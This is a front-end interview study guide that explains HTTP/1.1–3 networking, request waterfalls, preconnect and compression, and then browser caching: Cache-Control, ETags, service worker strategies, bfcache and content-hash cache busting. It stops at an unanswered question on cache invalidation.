Front-end performance lives or dies on the network, and "I minified my JS" is a junior answer. A senior candidate can trace a slow page to *when requests start and how many run in parallel*, name the handshakes a first request pays, and explain why the same bundle strategy that helped on HTTP/1.1 hurts on HTTP/2. Interviewers use this to separate people who read a Lighthouse score from people who can read a **waterfall chart in DevTools** and say "these three requests are serialized because B is discovered inside A — preload B." The version-differences question (H1 vs H2 vs H3) is a favourite because it forces you to connect protocol mechanics to concrete front-end decisions (bundling, domain sharding, `preconnect`), which is exactly the reasoning senior FE work requires.

**Common confusions**

- "HTTP/2 makes bundling pointless" — it makes *aggressive* bundling less necessary, but one giant bundle still blocks caching and parsing; the answer is *reasonable* splitting, not zero bundles.
- "HTTP/2 fixed head-of-line blocking" — it fixed it at the HTTP layer, but a lost TCP packet still stalls every stream (TCP-level HOL). Only HTTP/3 over QUIC fixes that.
- "A 304 means no request was made" — a 304 *is* a full round trip; the body is skipped, not the request. `Cache-Control: max-age` avoids the request entirely.
- "GET and POST differ only in where the data goes" — they differ in **semantics**: GET is safe/idempotent/cacheable, POST is none of those. That difference drives caching and reton safety.
- "More connections = faster" — beyond ~6 the browser throttles, and each new connection re-pays DNS/TCP/TLS. Reuse beats parallelism.

**What follows from this topic**

The caching headers introduced here (`Cache-Control`, `ETag`, `304`) get a full treatment in **Browser Caching** — this topic is *when the request happens*, that one is *whether it happens at all*. The waterfall-flattening tactics (preload, preconnect, code splitting) are the substance of **Web Performance — Loading**. The origin/CORS boundary connects to **Browser Security**, and the wire-level TCP/TLS/QUIC mechanics live in the **Networking** primer — come here for the browser's angle, go there for the packets.

### Q1. Walk through everything that happens between typing a URL and the first byte of HTML arriving.

For a fresh connection, the browser pays four stages in order, each costing at least one round trip:

```
DNS      TCP        TLS         HTTP
lookup → handshake → handshake → request → first byte (TTFB)
 ~1 RTT   1 RTT      1–2 RTT               response
```

1. **DNS** — resolve the hostname to an IP. Cached at the OS/browser level after the first lookup; otherwise a query to a resolver (its own round trip).
2. **TCP handshake** — SYN → SYN-ACK → ACK, one RTT, establishes the connection.
3. **TLS handshake** — negotiate cipher and keys. TLS 1.3 is one RTT; resumption can be zero. This is why HTTPS on a cold connection is slower than HTTP.
4. **HTTP request/response** — the browser sends `GET / HTTP/2`, the server processes and replies. The gap until the first response byte is **TTFB (Time To First Byte)**.

The practical lesson: the *first* request to any new origin pays DNS + TCP + TLS before any HTML moves. That's why `preconnect` to a critical third-party origin (a CDN, an API host) is a cheap win — it warms those three stages ahead of time. Every subsequent request to the same origin reuses the connection and skips straight to step 4.

### Q2. Compare HTTP/1.1, HTTP/2, and HTTP/3. How does each change your front-end strategy?

| | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---|---|---|---|
| Transport | TCP | TCP | QUIC (over UDP) |
| Concurrency | ~6 conns/origin, 1 request each | 1 conn, multiplexed streams | 1 conn, multiplexed streams |
| HOL blocking | Yes, at HTTP layer | Fixed at HTTP layer; still at TCP layer | None (per-stream, no TCP HOL) |
| Headers | Plaintext, repeated | HPACK compression | QPACK compression |
| Handshake | TCP + TLS separate | TCP + TLS | QUIC folds transport + TLS (0–1 RTT) |
| Server push | No | Yes (now deprecated) | No |

**HTTP/1.1** — only ~6 parallel requests per origin, each connection strictly one-at-a-time. FE tactics born here: **bundle aggressively** (fewer requests), **sprite images**, **inline critical assets**, **shard across domains** to get more than 6 connections. Head-of-line blocking means one slow response stalls the queue behind it.

**HTTP/2** — a single connection multiplexes unlimited streams, and headers are compressed. This *inverts* the old advice: **domain sharding hurts** (splits the multiplexed connection), and **over-bundling hurts** (one changed byte busts the cache for the whole bundle). Ship more, smaller, cacheable chunks. The catch: it still runs on TCP, so a single lost packet stalls *every* stream (TCP-level HOL blocking).

**HTTP/3** — runs over QUIC (on UDP), giving independent streams so a lost packet only stalls its own stream. Faster connection setup (transport + TLS in one). Same FE strategy as H2, with better behaviour on lossy/mobile networks.

The through-line: know your protocol before optimizing. Bundling and sharding are H1 tactics; on H2/H3 you split more and lean on `preconnect`/`preload` instead.

### Q3. What is a request waterfall and how do you flatten one?

A **waterfall** is the sequential dependency chain where each request can only start after the browser *discovers* it, and discovery usually requires downloading and parsing a parent resource first.

```
Serialized (slow):
HTML  ├────────┤
CSS            ├────────┤        (found in <link>)
font                    ├──────┤ (found in CSS url())
JS             ├────────┤        (found in <script>)

Flattened (fast):
HTML  ├────────┤
CSS   ├────────┤   preload
font  ├──────┤     preload
JS    ├────────┤   defer
```

The killer case is a *chain*: HTML → CSS → font, or JS → fetch config → fetch data. Each link adds a full round trip. To flatten:

- **`<link rel="preload">`** the resources you know you'll need but that are buried deep (fonts referenced in CSS, a hero image, a critical script) so the browser fetches them immediately instead of after discovery.
- **`<link rel="preconnect">`** to origins you'll hit (API host, CDN) to pre-warm DNS/TCP/TLS.
- **Parallelize data fetches** — if two API calls don't depend on each other, fire them together (`Promise.all`) instead of awaiting one then the other. Sequential `await`s are the JS equivalent of a waterfall.
- **Move discovery earlier** — inline critical CSS so there's no CSS round trip before first paint; put `<link>`/`preload` high in `<head>`.

Reading the DevTools Network waterfall and spotting the staircase pattern (each bar starting where the previous ends) is the core diagnostic skill.

### Q4. What does connection reuse / keep-alive buy you, and how do you take advantage of it?

Every new connection to an origin pays DNS + TCP + TLS before any data. **Keep-alive** holds the TCP (and TLS session) open after a response so the next request to the same origin skips straight to sending the HTTP request — often saving 2–3 round trips per asset.

Under HTTP/1.1 the browser keeps a pool of ~6 connections per origin alive and cycles requests through them. Under HTTP/2+ a *single* long-lived connection carries everything multiplexed, so reuse is even more valuable.

FE implications:
- **Serve assets from as few origins as possible** so connections are reused rather than re-established. This is exactly why HTTP/2 domain sharding backfires.
- **`preconnect`** to a critical cross-origin host warms the connection so the *first* real request to it doesn't pay the handshakes.
- Beware third-party origins: each one (analytics, fonts, ads) is a fresh DNS+TCP+TLS bill. Consolidate or `preconnect` the ones on the critical path.

### Q5. Give a quick map of HTTP methods and the status codes a front-end engineer must know.

**Methods** (the ones you use):
- **GET** — read; safe, idempotent, cacheable. No body.
- **POST** — create/submit; not safe, not idempotent, not cacheable by default.
- **PUT** — replace; idempotent.
- **PATCH** — partial update; not guaranteed idempotent.
- **DELETE** — remove; idempotent.
- **HEAD** — like GET, headers only. **OPTIONS** — used by CORS preflight.

"Safe" = no side effects (so the browser/proxy may prefetch it). "Idempotent" = repeating it has the same effect as doing it once (so it's retry-safe). That's why you never make a GET mutate data.

**Status codes**:
- **200** OK, **201** Created, **204** No Content.
- **301** Moved Permanently, **302/307** temporary redirect, **304** Not Modified (revalidation hit — see caching).
- **400** Bad Request, **401** Unauthorized (not authenticated), **403** Forbidden (authenticated, not allowed), **404** Not Found, **409** Conflict, **429** Too Many Requests (rate limited).
- **500** Internal Server Error, **502** Bad Gateway, **503** Service Unavailable, **504** Gateway Timeout.

The 401-vs-403 and 301-vs-302 distinctions, plus knowing 304 is a *revalidation success*, are the ones interviewers probe.

### Q6. What is head-of-line blocking, and at which layer does each HTTP version suffer it?

**Head-of-line (HOL) blocking** is when the first item in a queue stalls everything behind it, even though the later items are ready.

- **HTTP/1.1 — HTTP-layer HOL.** A connection handles one request at a time. If request #1's response is slow, requests #2–6 on that connection wait. The browser mitigates with ~6 parallel connections, but that's a hard ceiling.
- **HTTP/2 — TCP-layer HOL.** Multiplexing removes HOL blocking *at the HTTP layer* — many streams share one connection and interleave freely. But they all ride one TCP stream, and TCP guarantees in-order delivery, so a single **lost packet** forces every multiplexed stream to wait for the retransmit. On a clean network you never notice; on a lossy mobile link it bites.
- **HTTP/3 — solved.** QUIC gives each stream independent delivery, so a lost packet only stalls its own stream. This is the whole reason HTTP/3 exists — moving off TCP to kill transport-level HOL blocking.

The interview point: HTTP/2 didn't *eliminate* HOL blocking, it moved it down a layer. Only HTTP/3/QUIC removes it end to end.

### Q7. How do gzip and brotli compression fit in, and what should the front end compress?

Servers compress text responses and advertise it via `Content-Encoding`; the browser sends `Accept-Encoding: gzip, br` and decompresses transparently.

- **gzip** — universal, fast, good ratio. The safe default.
- **brotli (`br`)** — better ratio than gzip (often 15–25% smaller on JS/CSS/HTML), especially at high compression levels for static assets compressed once at build time. Now broadly supported.

What to compress: **text-based assets** — HTML, CSS, JS, JSON, SVG. These shrink dramatically because they're repetitive.

What *not* to compress: already-compressed binaries — JPEG/PNG/WebP images, WOFF2 fonts (WOFF2 is already brotli-compressed internally), video. Re-compressing them wastes CPU for near-zero gain.

FE angle: compression is mostly a server/CDN config, but you should verify it's on (check `Content-Encoding` in DevTools) — an uncompressed 300KB JS bundle is a common, invisible perf regression. Precompress static assets with brotli at build time so the server serves them without runtime CPU cost.

### Q8. `Cache-Control` and `ETag` set the stage — what's the front-end takeaway before we go deep on caching?

Two response headers decide whether a repeat request even happens:

- **`Cache-Control`** — the primary lever. `max-age=31536000` says "reuse this for a year without asking." `no-cache` says "you may store it, but revalidate before using." `no-store` says "never store it."
- **`ETag`** — a content fingerprint. On a revalidation the browser sends `If-None-Match: "<etag>"`; if unchanged the server replies **304 Not Modified** with an empty body, saving the download but not the round trip.

The front-end pattern that falls out of this: **hash your filenames** (`app.a1b2c3.js`) and serve them with `Cache-Control: max-age=31536000, immutable`. The content hash *is* the cache key, so you get permanent caching and instant cache-busting on change — a new build produces a new filename. The HTML that references those files stays short-lived or `no-cache` so new hashes are picked up. This is the whole story compressed; the Browser Caching topic expands each piece.

### Q9. You see a chain of three serialized requests in the Network panel. Diagnose and fix.

A serialized chain looks like a staircase: request B starts exactly where A ends, C where B ends. That's a **discovery dependency** — the browser didn't know it needed B until it finished parsing A.

Diagnosis steps:
1. **Read the Initiator column** in DevTools — it tells you what triggered each request. If `font.woff2` was initiated by `styles.css`, and `styles.css` by the HTML, that's your chain.
2. **Classify the chain.** Common ones: HTML → CSS → font/background-image; HTML → JS → `fetch('/config')` → `fetch('/data')`; HTML → framework JS → lazy chunk.

Fixes by type:
- **Asset chains** (font/image inside CSS): `<link rel="preload" as="font" href="/font.woff2" crossorigin>` in the HTML so the font fetch starts alongside the CSS, not after it.
- **Data chains** (fetch after fetch): if the second call doesn't depend on the first's result, run them in parallel with `Promise.all`. If it does depend, consider a single combined endpoint (BFF) so one round trip returns both.
- **Code chains** (lazy chunk after main bundle): `<link rel="modulepreload">` the chunk you know the route needs.

The meta-fix is always the same: **make the browser discover the resource earlier** so its request overlaps rather than follows.

### Q10. Why did HTTP/2 make domain sharding and aggressive bundling counterproductive?

Both were **HTTP/1.1 workarounds** for its ~6-connections-per-origin, one-request-per-connection limit.

- **Domain sharding** — serving assets from `static1.example.com`, `static2.example.com`, etc., tricked the browser into opening 6 connections *per shard*, getting past the parallelism cap. Under HTTP/2, one connection multiplexes everything, so sharding *splits* that single efficient connection into several, each re-paying DNS/TCP/TLS and losing shared prioritization and header compression. Net negative.
- **Aggressive bundling** — concatenating everything into one JS file minimized the request count when requests were expensive. Under HTTP/2 requests are cheap (multiplexed), so a giant bundle mostly hurts: one changed line busts the cache for the entire file, and the browser must parse/execute the whole thing before anything runs. Splitting into route-level chunks means unchanged chunks stay cached across deploys and only what's needed loads.

The rule: **optimize for caching and parse cost on H2/H3, not for request count.** Ship several right-sized, content-hashed chunks and let multiplexing handle concurrency.

### Q11. What is TTFB, what drives it, and is it a front-end problem?

**TTFB (Time To First Byte)** is the interval from starting the request to receiving the first response byte. It bundles: DNS + TCP + TLS (connection setup) + server processing + network transit.

It's *partly* a front-end problem:
- **Connection setup** you influence with `preconnect` and by minimizing origins.
- **Redirects** inflate it — each `301/302` is a whole extra round trip before real content. Kill redirect chains (e.g. `http→https→www` should be one hop).
- **Server processing** is backend/CDN territory — slow database queries, no edge caching. As FE you flag it but don't fix it directly.

Why it matters: TTFB is the floor under every other metric. **LCP** can't happen before the HTML arrives, which can't happen before TTFB. A 600ms TTFB is 600ms you can never recover with clever client-side code. Serving HTML from a CDN edge (SSG/ISR, cross-ref Rendering Strategies) or caching at the edge is the biggest TTFB lever.

### Q12. What happens on the network when a user navigates within a Single Page App versus a full page load?

**Full page load (or hard navigation):** the browser tears down the current document and runs the whole pipeline — DNS/TCP/TLS if a new origin, download HTML, parse, fetch all sub-resources (CSS/JS/images), build the render tree, paint. Everything re-downloads unless cached.

**SPA navigation (soft navigation):** no new document. JavaScript intercepts the click, calls `history.pushState` to update the URL without a request, and issues **only data requests** (`fetch('/api/...')`) for what the new view needs. The framework re-renders the changed DOM. No HTML/CSS/JS re-download, no full pipeline.

Network implications:
- SPA nav is *fast after first load* — you already have the JS, you just fetch JSON. But the **first** load is heavier: you shipped a big JS bundle to enable client routing.
- The tradeoff is the classic CSR cost (cross-ref Rendering Strategies): slow first paint, fast subsequent navigation.
- You still pay for **data waterfalls** inside a soft navigation — if the new route fetches config then data then user, that's three serialized round trips the user watches as a spinner. Parallelize or prefetch on hover/intent.

### Q13. How would you speed up a page that loads 40 small images from your own server?

First, identify the protocol — the answer differs sharply.

**On HTTP/1.1**, 40 images against a ~6-connection cap means ~7 sequential batches; each batch waits on the slowest image. Fixes: fewer requests (CSS sprites or an image atlas), inline tiny icons as data URIs or SVG, lazy-load below-the-fold images so only the visible ones compete for connections.

**On HTTP/2/3**, all 40 multiplex over one connection, so request count is far less of a problem — the fix shifts to *bytes and priority*:
- **Lazy-load** off-screen images with `loading="lazy"` so they don't compete with critical content.
- **Right-size and modernize**: serve WebP/AVIF, use `srcset`/`sizes` so each device gets an appropriately scaled image instead of a desktop-sized one.
- **Prioritize the hero**: `fetchpriority="high"` on the LCP image, low on decorative ones.
- **Cache aggressively**: content-hashed filenames with `max-age` so repeat visits pay nothing.

The senior move is naming the protocol first, then choosing the tactic — sprite-and-inline is H1 thinking; lazy-load-and-modern-formats is H2/H3 thinking.

### Q14. What is `preconnect` versus `dns-prefetch`, and when do you use each?

Both warm up a cross-origin connection *before* the browser would naturally need it, cutting handshake latency off the critical path.

- **`<link rel="dns-prefetch" href="//cdn.example.com">`** — resolves just the **DNS** for the origin. Cheap, low-risk, widely supported. Use it as a lightweight hint for origins you *might* hit (several third parties).
- **`<link rel="preconnect" href="https://cdn.example.com" crossorigin>`** — does the full **DNS + TCP + TLS** handshake. Much bigger win but more expensive, so reserve it for **critical** origins you're *certain* to use immediately (your API host, the CDN serving your LCP image, a fonts origin). Overusing preconnect wastes connections and can slow things down.

Rule of thumb: `preconnect` the 2–4 origins on your critical path; `dns-prefetch` the long tail. For same-origin assets neither is needed — you're already connected. Note the `crossorigin` attribute matters for fonts/CORS resources; omitting it opens a connection the actual request can't reuse.

### Q15. A third-party analytics script is slowing your page. What's happening on the network and how do you mitigate it?

The network cost of a third party is usually invisible until you read the waterfall:

- Each third-party origin is a **fresh DNS + TCP + TLS** bill — no connection reuse with your origin.
- A synchronous `<script src="analytics.com/a.js">` is **parser-blocking**: HTML parsing halts until it downloads and executes (cross-ref the browser's rendering-path topic).
- The script itself may fire more requests (beacons, additional scripts), extending the waterfall you don't control.

Mitigations, in order:
1. **`async` or `defer`** the script tag so it never blocks HTML parsing. Analytics almost always tolerates `async`.
2. **`preconnect`** to the analytics origin so when it does load, it skips the handshakes.
3. **Delay non-critical third parties** until after load/interaction (`requestIdleCallback`, or load on first user interaction) so they don't compete with your critical content for bandwidth and main-thread time.
4. **Self-host or proxy** where licensing allows, collapsing the extra origin into your own (reusing the connection).
5. **Budget and audit** — third parties are the top cause of surprise regressions; measure their real cost in the Network and Performance panels.

### Q16. Explain conditional requests and the 304 flow, and where they help versus where `max-age` is better.

A **conditional request** asks the server "has this changed since I last fetched it?" using a validator:

```http
GET /styles.css HTTP/1.1
If-None-Match: "abc123"
If-Modified-Since: Mon, 01 Jul 2026 10:00:00 GMT
```

The server compares the **ETag** (content hash) or last-modified date. If unchanged it replies:

```http
HTTP/1.1 304 Not Modified
```

— an **empty body**. The browser reuses its cached copy. You saved the *download* but still paid a full *round trip*.

Where 304/revalidation helps: assets that change occasionally and where staleness is unacceptable — the HTML shell, a config file, an API response with `Cache-Control: no-cache` (which means "store but always revalidate"). You get freshness with a cheap validation instead of a full re-download.

Where `max-age` is strictly better: **immutable, content-hashed static assets** (`app.a1b2c3.js`). With `Cache-Control: max-age=31536000, immutable` the browser doesn't even *ask* — zero round trips on repeat visits. A 304 still costs the RTT, so for assets that never change (because a change means a new filename), skip revalidation entirely. The design pattern: long `max-age` + content hashing for static assets, `no-cache`/revalidation for the HTML that points at them. Full treatment in Browser Caching.

## Browser Caching

### Summary

**What this topic covers**

The layered caches a browser uses to avoid re-fetching, re-parsing, and re-rendering — and how a front-end engineer controls them. Four caches stack up: the **HTTP cache** (governed by `Cache-Control`, `ETag`/`If-None-Match` → 304), split under the hood into **memory cache** (fast, per-session) and **disk cache** (persistent); the programmable **Service Worker cache** (you write the caching logic — cache-first, network-first, stale-while-revalidate, offline support); and the **back/forward cache (bfcache)** that snapshots a whole live page for instant back/forward navigation. Around these sits the strategy layer: **cache busting** via content-hash filenames, **cache invalidation** patterns, and how all of this collapses repeat-visit load time toward zero. The 15 questions here build on the caching headers introduced in HTTP & Networking — that topic is *when a request happens*, this one is *whether it happens at all*.

**Mental model**

Think of caching as a series of gates a request passes through, cheapest first. Before the browser touches the network it asks, in order: is there a fresh **HTTP cache** entry (`max-age` not expired)? → serve it, zero network. Is there a stale-but-validatable entry (has an `ETag`)? → send a conditional request, maybe get a cheap 304. Is a **Service Worker** installed that wants to answer? → it decides entirely in JS. Is this a back/forward navigation with a **bfcache** snapshot? → restore the frozen page instantly, no reload at all. Only if every gate misses does a full network fetch happen. Your job as a front-end engineer is to configure those gates so the *right* things are cached *aggressively* (immutable static assets: cache forever) and the *wrong* things aren't (HTML, user-specific data: revalidate or don't store). The master trick that makes "cache forever" safe is **content hashing**: put the content's fingerprint in its filename, so a change is a new URL and there's nothing to invalidate.

**Key terms**

- **HTTP cache** — the browser's built-in cache keyed by URL, controlled by response headers.
- **`Cache-Control`** — the header that dictates cacheability: `max-age`, `no-cache`, `no-store`, `immutable`, `public`/`private`.
- **`max-age`** — seconds a response stays *fresh* (usable with no network at all).
- **`no-cache`** — store it, but always revalidate before use (not "don't cache").
- **`no-store`** — never write it to any cache.
- **`immutable`** — promise it will never change; skip revalidation entirely.
- **`ETag` / `If-None-Match`** — content validator enabling a **304 Not Modified** revalidation.
- **Memory vs disk cache** — RAM (fast, cleared on tab close) vs persistent disk storage.
- **Service Worker cache (Cache API)** — programmable cache you populate and serve from in JS.
- **bfcache** — a full in-memory snapshot of a page for instant back/forward restoration.
- **Cache busting** — forcing a re-fetch by changing the URL (usually a content hash in the filename).
- **Cache invalidation** — the hard problem of ensuring users stop getting a stale cached copy.

**Why interviewers ask this**

Caching is where "make it fast" meets "and still correct," and the tension between the two is a senior signal. Anyone can set `max-age`; the interviewer wants to know if you understand that `no-cache` doesn't mean "don't cache," that a 304 still costs a round trip, and that the reason you can safely cache JS *forever* is content hashing on the HTML that references it. The classic Phil Karlton line — "there are only two hard things in computer science: cache invalidation and naming things" — is the whole point: candidates who can explain the **content-hash strategy** have solved invalidation by design rather than by cache-clearing hacks. Service Workers and bfcache probe whether you know the modern toolbox for offline and instant navigation, and whether you know the *footguns* (a bad Service Worker can serve stale code indefinitely; `unload` handlers silently disable bfcache).

**Common confusions**

- "`no-cache` means don't cache" — it means *store but revalidate every time*. `no-store` is the one that means don't cache.
- "A 304 is free" — it's a full round trip; only `max-age` freshness avoids the network entirely.
- "Cache invalidation means clearing the cache" — the *good* answer is to never need to: change the URL (content hash) so old and new coexist.
- "Service Workers make everything faster" — a misconfigured SW can trap users on stale JS; it needs a real update strategy.
- "bfcache is just the HTTP cache" — no, it's a snapshot of the *entire live page* (DOM, JS heap, scroll position), restored without re-running anything.
- "Hard refresh proves my cache config" — Ctrl+Shift+R bypasses caches; test with normal navigation.

**What follows from this topic**

The `Cache-Control`/`ETag` mechanics here are the payoff of the headers introduced in **HTTP & Networking**. Content-hash cache busting is produced by the **bundler** (cross-ref Architecture & Tooling) and is a core tactic in **Web Performance — Loading** for making repeat visits instant. The Service Worker cache connects to **Web APIs** (Service Workers as a network proxy) and to **Rendering Strategies** (offline-first PWAs). Caching cuts *repeat-visit* load time; the loading topic cuts *first-visit* load time — together they're the two halves of a fast site.

### Q1. Walk through the browser's HTTP cache decision for a repeat request.

When the browser is about to fetch a URL it already has cached, it runs a freshness check:

```
Is a cached entry present?
  no  → fetch from network (200)
  yes → is it still FRESH? (within max-age / not past Expires)
          yes → serve from cache, NO network request  (fastest)
          no  → is there a validator? (ETag / Last-Modified)
                  yes → send conditional request (If-None-Match)
                          server: 304 → reuse cached body (cheap, but 1 RTT)
                          server: 200 → download new body
                  no  → full fetch (200)
```

Two distinct wins hide in here:
- **Fresh hit** — the response's `max-age` hasn't elapsed, so the browser serves the cached copy with **zero network activity**. This is the gold standard; DevTools shows "(memory cache)" or "(disk cache)."
- **Revalidation hit (304)** — the response is stale but has an `ETag`, so the browser asks "still valid?" and gets a small 304 back. Saves the download but still pays a round trip.

The design goal is to maximize *fresh* hits for things that don't change (via long `max-age` + content hashing) and fall back to cheap revalidation only for things that might (the HTML).

### Q2. Explain each `Cache-Control` directive a front-end engineer sets.

```http
Cache-Control: max-age=31536000, immutable   // hashed static asset
Cache-Control: no-cache                        // HTML shell
Cache-Control: no-store                        // sensitive/user data
Cache-Control: private, max-age=0, must-revalidate
```

- **`max-age=<seconds>`** — how long the response is *fresh* (served with no network). `31536000` = one year, the standard for immutable assets.
- **`no-cache`** — **store it, but revalidate every time** before serving. The most-misunderstood directive: it does *not* mean "don't cache." Perfect for HTML — you keep a copy but always check for a new version via ETag.
- **`no-store`** — never write it to any cache at all. For sensitive or highly dynamic responses (banking pages, personalized API data).
- **`immutable`** — tells the browser the content will *never* change within its freshness lifetime, so it shouldn't even revalidate on reload. Pair with a content hash and a long `max-age`.
- **`public`** — any cache (including shared CDN/proxy) may store it. **`private`** — only the browser, not shared caches (for user-specific responses).
- **`must-revalidate`** — once stale, the cache *must* revalidate and not serve stale on error.

The two-tier pattern: hashed static assets get `max-age=31536000, immutable`; the HTML that references them gets `no-cache` (or a very short max-age) so new hashes are always discovered.

### Q3. What's the difference between the memory cache and the disk cache?

Both are parts of the browser's HTTP cache, differing in storage medium and lifetime:

- **Memory cache** — held in **RAM**. Extremely fast (no I/O), but scoped to the current page/session and cleared when the tab closes. The browser uses it for resources reused *within the same page load* — e.g. an image referenced twice, or assets fetched moments ago. DevTools shows "(memory cache)."
- **Disk cache** — persisted to the **filesystem**. Slower than RAM but survives tab and browser restarts, so it serves repeat *visits* days later. DevTools shows "(disk cache)."

You don't control which tier the browser picks — it's a heuristic based on size, frequency, and memory pressure (large or rarely-used items lean disk; small hot items lean memory). What you control is *whether the resource is cacheable at all* (via `Cache-Control`) and its freshness window. The practical takeaway: "(memory cache)" in the waterfall means a same-session re-hit; "(disk cache)" means the persistence across visits that your `max-age` bought you is working.

### Q4. What is a Service Worker cache and how does it differ from the HTTP cache?

A **Service Worker** is a script that sits between your page and the network as a programmable proxy. It can intercept every `fetch` and decide how to respond — including from the **Cache API**, a storage area you populate and read entirely in JavaScript.

Differences from the HTTP cache:
- **Programmable, not header-driven.** The HTTP cache obeys `Cache-Control` automatically; the Service Worker cache is *whatever you code* — you choose what to store, when to update, and how to match requests.
- **Enables true offline.** Because the SW answers `fetch` events, a cached app can load with no network at all — the basis of PWAs.
- **Explicit lifecycle.** You precache assets on `install`, clean old caches on `activate`, and serve on `fetch`.

```javascript
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) =>
      cached || fetch(event.request)   // cache-first strategy
    )
  );
});
```

The power comes with a footgun: a Service Worker can serve stale code *indefinitely* if you don't implement an update strategy, because it answers before the network. Cross-ref Web APIs for the SW lifecycle; the strategies come next.

### Q5. Compare cache-first, network-first, and stale-while-revalidate.

These are the three Service Worker caching strategies; each trades freshness against speed differently.

| Strategy | Serves from | Freshness | Best for |
|---|---|---|---|
| **Cache-first** | Cache, network only on miss | Can be stale | Hashed static assets, fonts, offline shell |
| **Network-first** | Network, cache only on failure | Always fresh if online | API data, HTML you want current |
| **Stale-while-revalidate** | Cache immediately, update in background | Stale now, fresh next time | Avatars, semi-dynamic content |

- **Cache-first** — check cache, use it if present, only hit the network on a miss. Fastest and offline-capable, but risks staleness — only safe when the URL changes on content change (content hashing) or staleness is acceptable.
- **Network-first** — try the network, fall back to cache if offline/slow. Always current when connected; gives offline resilience without staleness. Costs a network round trip on every request.
- **Stale-while-revalidate** — serve the cached copy *instantly* for speed, and simultaneously fetch a fresh copy in the background to update the cache for *next* time. Best perceived performance for content that can be a version behind. This is also the semantic behind the `stale-while-revalidate` `Cache-Control` directive and the data-fetching pattern (cross-ref State & Data Fetching).

Rule of thumb: cache-first for immutable assets, network-first for critical live data, stale-while-revalidate for the comfortable middle.

### Q6. What is the back/forward cache (bfcache) and what disqualifies a page from it?

The **bfcache** stores a complete **in-memory snapshot** of a page — the full DOM, the JavaScript heap, scroll position, even in-progress state — when the user navigates away. On back/forward it *restores* that snapshot instantly, without re-fetching, re-parsing, or re-executing anything. Navigation feels immediate (near-zero LCP) instead of a full reload.

It's not the HTTP cache: the HTTP cache stores individual *responses*; bfcache freezes the entire *living page*.

Common **disqualifiers** (things that force a full reload instead):
- An **`unload` event listener** — the single most common killer. Use `pagehide`/`visibilitychange` instead.
- `Cache-Control: no-store` on the main document.
- An open `IndexedDB` transaction or in-flight `fetch`/connection at navigation time.
- Certain `Cache-Control: no-cache` + permission/feature combinations, or pages with open WebSockets in some browsers.

To keep bfcache working: drop `unload` handlers, avoid `no-store` on documents that don't need it, and **test with the DevTools bfcache tester** (Application → Back/forward cache). Restoring correctly also means handling the `pageshow` event with `event.persisted === true` to refresh anything time-sensitive (e.g. re-check auth) since your JS didn't re-run.

### Q7. Explain cache busting with content-hash filenames and why it solves invalidation.

**Cache busting** is forcing the browser to fetch a new version by changing the resource's URL. The clean way is to embed a **hash of the file's contents** in its filename at build time:

```
app.js         →  app.a1b2c3d4.js
styles.css     →  styles.9f8e7d6c.css
```

The bundler (webpack/Vite/Rollup — cross-ref Architecture & Tooling) computes the hash and rewrites every reference in the HTML to point at the hashed name.

Why this *solves* invalidation rather than managing it:
- The filename **is** the cache key. Identical content → identical hash → identical URL → served from cache forever (`max-age=31536000, immutable`). Zero revalidation, zero staleness risk.
- A single changed byte → new hash → new URL → the browser has never seen it → guaranteed fresh fetch. There's nothing to *invalidate* — old and new versions have different names and coexist safely.
- The only file that must stay short-lived is the **HTML**, served `no-cache`, because it's what maps the stable logical asset to its current hashed URL. Fetch fresh HTML → learn the new hashes → fetch only the changed chunks.

This is the answer to "cache invalidation is hard": don't invalidate, rename. It also makes deploys atomic — users mid-session keep loading their old chunks (still cached under old names) instead of hitting 404s.

### Q8. `no-cache` versus `no-store` versus `max-age=0` — what's the real difference?

These are constantly confused. Concretely:

- **`no-store`** — the browser must **never write the response to any cache**. Every request goes to the network. Use for sensitive/personal data you don't want on disk.
- **`no-cache`** — the browser **may store** the response but must **revalidate with the server before every use** (via ETag/conditional request). If the server returns 304, the cached copy is reused. So it *does* cache — it just never serves without checking. Ideal for HTML.
- **`max-age=0`** — the response is cached but immediately stale, so it behaves much like `no-cache` (revalidate before use). Often paired with `must-revalidate`.

The killer distinction: **`no-cache` still lets you benefit from a 304** (empty-body revalidation — you skip the download), while **`no-store` re-downloads the full body every time** because nothing was kept. So for an HTML document that changes occasionally, `no-cache` is *faster* than `no-store` (cheap revalidation vs full re-fetch) while staying just as fresh. Reach for `no-store` only when you genuinely must not persist the bytes.

### Q9. How much does caching cut repeat-visit load time, and why?

Dramatically — often the difference between a 2-second first visit and a sub-200ms repeat visit. The mechanism:

On a **first visit**, everything is a cold fetch: HTML, CSS, JS, fonts, images — each paying network transfer, and the JS additionally paying parse/compile. This is your LCP-dominated first-load story (cross-ref Web Performance — Loading).

On a **repeat visit** with good caching:
- All content-hashed static assets (the bulk of the bytes — JS/CSS/fonts) are served **from disk cache with zero network requests** because they're `immutable` and unchanged. That erases most transfer time.
- Only the **HTML** is re-fetched (`no-cache`), and often that's a cheap 304 or a tiny document.
- If a **Service Worker** precached the app shell, even the HTML can come from cache — instant first paint, offline-capable.
- Back/forward navigations hit the **bfcache** for a near-instant restore with no work at all.

So caching mostly removes the *network transfer* cost on repeat visits; the remaining cost is parse/execute of the JS (which HTTP caching doesn't skip — the browser still runs it). That's why reducing *bundle size* matters even with perfect caching, and why V8 code caching exists to speed re-parse. The headline: caching turns the expensive first visit into a cheap repeat visit, which is why it's the highest-leverage repeat-performance lever.

### Q10. Your users are stuck on an old version of the app after a deploy. Diagnose.

This is a caching-gone-wrong classic. Work the gates from most to least likely:

1. **The HTML is being cached.** If `index.html` was served with a long `max-age` (or no `Cache-Control` and a heuristic kicked in), users hold a stale HTML that references *old* hashed asset URLs — so they never learn the new hashes. **Fix:** serve HTML `no-cache` (or very short max-age). This is the #1 cause.
2. **A Service Worker is serving stale assets.** A cache-first SW without an update strategy will answer from its old cache forever. **Fix:** implement `install`→`activate` cache versioning, call `skipWaiting()`/`clients.claim()`, and clean old caches on activate. Users may need one more navigation for the new SW to take control.
3. **A CDN/proxy is caching the HTML** (`public`) and hasn't been purged. **Fix:** purge the CDN on deploy, or mark HTML `private`/short-lived.
4. **Immutable assets cached correctly but referenced by stale HTML** — same root cause as #1; the assets are fine, the pointer is stale.

The preventive design is the two-tier policy: `immutable` hashed assets + `no-cache` HTML, plus a Service Worker update strategy if you have one. The tell that it's #1 vs #2: if a hard refresh fixes it but normal reload doesn't and there's no SW → HTML caching; if even the SW keeps serving old code → SW update strategy.

### Q11. Why is "cache invalidation" considered one of the hard problems, and how do modern front ends sidestep it?

